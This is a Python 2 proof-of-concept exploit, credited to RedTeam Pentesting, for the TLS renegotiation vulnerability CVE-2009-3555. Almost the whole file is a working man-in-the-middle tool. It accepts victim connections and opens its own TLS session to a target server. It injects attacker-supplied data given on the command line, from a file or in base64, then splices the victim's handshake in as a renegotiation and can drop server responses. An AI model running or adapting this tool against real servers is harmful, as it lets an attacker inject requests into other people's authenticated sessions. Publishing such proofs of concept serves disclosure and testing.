#!/usr/bin/env python

######################################
#                                    #
#  RedTeam Pentesting GmbH           #
#  kontakt@redteam-pentesting.de     #
#  http://www.redteam-pentesting.de  #
#                                    #
######################################

# PoC exploit for the TLS renegotiation vulnerability (CVE-2009-3555)

# License
# -------
# CC-BY-SA http://creativecommons.org/licenses/by-sa/3.0/

# Timeline
# --------
# 2009-12-21 initial public release

# Known Issues
# ------------
# Firefox: if it fails connecting to a TLS site too often, falls back to
#          issuing SSLv2 ClientHello only until browser is restarted
#
# wget:    attempts SSLv2 ClientHello by default

# References
# ----------
# http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3555
# http://www.phonefactor.com/sslgap
# http://www.extendedsubset.com/
# http://www.g-sec.lu/practicaltls.pdf
# http://tools.ietf.org/html/draft-ietf-tls-renegotiation-01

import tlslite
import tlslite.api
import tlslite.messages
import tlslite.constants
import struct
import socket
import threading
import array
import sys
import optparse


if not hasattr(threading.Thread, 'name'):
    # emulate python 2.6 threading module for earlier versions
    threading.current_thread = threading.currentThread
    setattr(threading.Thread, 'name',
            property(threading.Thread.getName, threading.Thread.setName))

def forward(sock1, sock2):
    sock1.settimeout(1.0)
    while True:
        try:
            data = sock1.recv(4096)
            if not data:
                return
            sock2.send(data)
        except socket.error, ex_error:
            if ex_error[0] == 104: # Connection reset by peer
                return
        except socket.timeout, ex_timeout:
            pass


class MessageWrapper(object):
    def __init__(self, version = (3, 1), ssl2 = False):
        self.contentType = tlslite.messages.ContentType.handshake
        self.ssl2 = ssl2
        self.client_version = version

    def setType(self, type):
        self.contentType = type

    def addBytes(self, bytes):
        self.bytes = bytes

    def write(self, trial=False):
        if trial:
            raise Exception('Unsupported')
        return array.array('B', self.bytes)

def send_record(sock, msg_type, version_major, version_minor, record):
    msg = struct.pack('!BBBH', msg_type, version_major, version_minor, len(record))
    if type(record) != str:
        msg += record.tostring()
    else:
        msg += record
    sock.send(msg)

def send_encapsulated(sslsock, type, messagebytes, version = (3, 1)):
    msg = MessageWrapper(version)
    msg.addBytes(struct.unpack('B'*len(messagebytes), messagebytes))
    msg.setType(type)
    for dummy in sslsock._sendMsg(msg, True):
        pass

def decrypt_record(sslsock, type, recordbytes):
    for result in sslsock._decryptRecord(type, array.array('B', recordbytes)):
        pass
    return result

def recv_record(sock):
    try:
        header = sock.recv(5)
        if not header:
            return None, None, None, None
        msg_type, msg_version_major, msg_version_minor, msg_length = struct.unpack('!BBBH', header)
        record = ''
        while len(record) != msg_length:
            record += sock.recv(msg_length - len(record))
        return msg_type, msg_version_major, msg_version_minor, record
    except socket.error, ex:
        if ex[0] == 104: # Connection reset by peer
            return

def recv_clienthello(sock):
    header_bytes = []
    header_bytes.append(sock.recv(1))
    header_bytes[0] = struct.unpack('!B', header_bytes[0])[0]
    if header_bytes[0] & 0x80:
        # Version 2.0 Client "Record Layer"
        header_bytes.append(sock.recv(1))
        header_bytes[1] = struct.unpack('!B', header_bytes[1])[0]
        msg_length = (header_bytes[0] & 0x7f) << 8 | header_bytes[1]
        msg_version_major = 2
        msg_version_minor = 0
        msg_type = tlslite.constants.ContentType.handshake
        record = sock.recv(msg_length)
    else:
        header = sock.recv(4)
        msg_type = header_bytes[0]
        msg_version_major, msg_version_minor, msg_length = struct.unpack('!BBH', header)
        record = sock.recv(msg_length)

    return msg_type, msg_version_major, msg_version_minor, record

def send_hello_request(sock):
    sock.send("\x16"            # Record Layer: Handshake Message
             +"\x03\x01"        # Record Layer Version: TLS 1.0
             +"\x00\x04"        # Record Layer Length: 4
             +"\x00"            # Handshake Message Type: Hello Request
             +"\x00\x00\x00")   # Handshake Message Length: 0

def send_protocol_version_alert(sock):
    sock.send("\x15"            # Record Layer: Alert"
             +"\x03\x01"        # Record Layer Version: TLS 1.0
             +"\x00\x02"        # Record Layer Length: 2
             +"\x00"            # Alert Message: fatal
             +"\x46")           # Alert Message: protocol version


def handle_victim(victim, options, mitmcount):

    if options.one_shot and mitmcount != 0:
        print threading.current_thread().name, '--one-shot specified and initial connection already handled, forwarding only'
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            sock.connect(options.target)
            print threading.current_thread().name, 'Connected to target %s:%u' % options.target
        except socket.error, ex:
            print threading.current_thread().name, 'Couldn\'t connect to target %s:%u' % options.target
            print threading.current_thread().name, 'Error code %u, \'%s\'' % (ex[0], ex[1])
            sys.exit(1)

        t1 = threading.Thread(target=forward, args=(sock, victim))
        t1.start()

        t2 = threading.Thread(target=forward, args=(victim, sock))
        t2.start()

        t1.join()
        sock.close()

        t2.join()
        victim.close()
        return

    # obtain initial "client hello" message
    msg_type, msg_version_major, msg_version_minor, hello_msg = recv_clienthello(victim)
    if msg_version_major == 2:
        print threading.current_thread().name, "client sent SSLv2 client hello message, exiting thread"
        return

    tls_version = (msg_version_major, msg_version_minor)
    type, length, version_major, version_minor, random, session_id_length = struct.unpack('!B3sBB32sB', hello_msg[:39])
    resume_session = (session_id_length != 0)
    if resume_session:
        print threading.current_thread().name, "client attempting to resume session"

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect(options.target)
        print threading.current_thread().name, 'Connected to target %s:%u' % options.target
    except socket.error, ex:
        print threading.current_thread().name, 'Couldn\'t connect to target %s:%u' % options.target
        print threading.current_thread().name, 'Error code %u, \'%s\'' % (ex[0], ex[1])
        sys.exit(1)


    sslsock = tlslite.api.TLSConnection(sock)
    handshake_settings = tlslite.HandshakeSettings.HandshakeSettings()
    handshake_settings.minVersion = tls_version
    handshake_settings.maxVersion = tls_version
    sslsock.handshakeClientCert(settings = handshake_settings)

    # inject prefix
    sslsock.write(options.inject)
    print threading.current_thread().name, 'Injected %s' % repr(options.inject)

    # send original "client hello" message over the encrypted channel
    send_encapsulated(sslsock, 22, hello_msg, tls_version)

    # now receive serveral TLS messages from the server, decrypt them, and forward
    # them to the client, until the server sends "server hello done"
    # these messages include "server hello", "certificate", "server key exchange",
    # unless the client is trying to resume a previous session
    print threading.current_thread().name, "about to receive server handshake messages"
    server_handshake_done = False
    while not server_handshake_done:
        msg_type, msg_version_major, msg_version_minor, result = recv_record(sslsock.sock)
        if result:
            result = decrypt_record(sslsock, msg_type, result)
            send_record(victim, msg_type, msg_version_major, msg_version_minor, result)
            if result[0] == 0x0e: # server hello done - should terminate handshake
                server_handshake_done = True
            elif resume_session and msg_type == 0x14: # change cipher spec - probably irrelevant
                server_handshake_done = True
        else:
            print threading.current_thread().name, 'receive from server failed, exiting thread'
            return
    print threading.current_thread().name, "server handshake done"


    # now its the the client's turn to send some messages, e.g.
    # "client key exchange" and "change cipher spec"
    print threading.current_thread().name, "about to receive client handshake messages"
    handshake_finished = False
    while not handshake_finished:
        msg_type, msg_version_major, msg_version_minor, record = recv_record(victim)
        print threading.current_thread().name, msg_type
        send_encapsulated(sslsock, msg_type, record, tls_version)
        if msg_type == 0x14: # change cipher spec
            handshake_finished = True

    print threading.current_thread().name, "client handshake done"

    # message after "change cipher spec" must be sent in the "clear"
    msg_type, msg_version_major, msg_version_minor, record = recv_record(victim)
    send_record(sslsock.sock, msg_type, msg_version_major, msg_version_minor, record)

    # server should now send "change cipher spec" message, we decrypt and send that to the victim
    msg_type, msg_version_major, msg_version_minor, record = recv_record(sslsock.sock)
    result = decrypt_record(sslsock, msg_type, record)
    send_record(victim, msg_type, msg_version_major, msg_version_minor, result)

    # finalize handshake
    msg_type, msg_version_major, msg_version_minor, record = recv_record(sslsock.sock)
    if record:
        send_record(victim, msg_type, msg_version_major, msg_version_minor, record)
    else:
        sslsock.sock.close()
        victim.close()
        del sslsock
        return



    # the rest is just forwarding TLS records between both parties,
    # which we cannot interfere with anymore, apart from dropping server
    # responses
    if options.drop:
        sslsock.sock.close()
        del sslsock
    else:
        t1 = threading.Thread(target=forward, args=(sslsock.sock, victim))
        t1.start()

    t2 = threading.Thread(target=forward, args=(victim, sslsock.sock))
    t2.start()

    if not options.drop:
        t1.join()
        sslsock.sock.close()

    t2.join()
    victim.close()



if __name__ == "__main__":
    parser = optparse.OptionParser()
    parser.add_option('-l', '--listen', dest='listen_port', help='port to listen on', metavar='PORT', type='int', default=8443)
    parser.add_option('-b', '--bind', dest='bind_address', help='address to bind to', metavar='ADDRESS', default='0.0.0.0')
    parser.add_option('-t', '--target', dest='target', help='host and port to connect to', metavar='HOST:PORT' )
    parser.add_option('-i', '--inject', dest='inject', help='string to inject', metavar='DATA')
    parser.add_option('', '--inject-file', dest='inject_file', help='inject data from a file', metavar='FILE')
    parser.add_option('', '--inject-base64', dest='inject_base64', help='string to inject, base64-encoded', metavar='DATA')
    parser.add_option('-o', '--one-shot', dest='one_shot', action='store_true', help='only mitm the first connection attempt, forward all other connections')
    parser.add_option('-d', '--drop-responses', dest='drop', action="store_true", default=False, help='drop server responses after renegotiating')

    (options, args) = parser.parse_args()

    if len([i for i in (options.inject, options.inject_file, options.inject_base64) if i]) != 1:
        print 'Exactly one injection option must be specified'
        sys.exit(1)

    if options.inject_file:
        try:
            options.inject = open(options.inject_file, 'r').read()
        except IOError, ex:
            print ex
            sys.exit(1)

    if options.inject_base64:
        import base64
        try:
            options.inject = base64.decodestring(options.inject_base64)
        except base64.binascii.Error, ex:
            print 'Error decoding base64 data: %s' % ex
            sys.exit(1)


    if not options.listen_port or \
       not options.bind_address or \
       not options.target or \
       not options.inject:
        parser.print_help()
        sys.exit(1)

    target = options.target.split(':')
    if len(target)==2:
        try:
            target[1] = int(target[1])
        except ValueError:
            target[1] = None
    if len(target)!=2 or not target[0] or not target[1]:
        print 'Target \'%s\' not in format HOST:PORT' % options.target
        sys.exit(1)

    options.target = tuple(target)

    try:
        listensocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listensocket.bind((options.bind_address, options.listen_port))
        print 'Listening on %s:%u' % (options.bind_address, options.listen_port)
    except socket.error, ex:
        print 'Couldn\'t listen on %s:%u' % (options.bind_address, options.listen_port)
        print 'Error code %u, \'%s\'' % (ex[0], ex[1])
        sys.exit(1)

    listensocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listensocket.listen(5)

    mitmcount = 0

    while True:
        try:
            victim, victimaddr = listensocket.accept()
            print 'New connection from %s:%u' % victimaddr

            threading.Thread(target=handle_victim, args=(victim, options, mitmcount)).start()
            mitmcount += 1

        except KeyboardInterrupt, ex:
            print '\nAborted by user, exiting...'
            listensocket.close()
            sys.exit(1)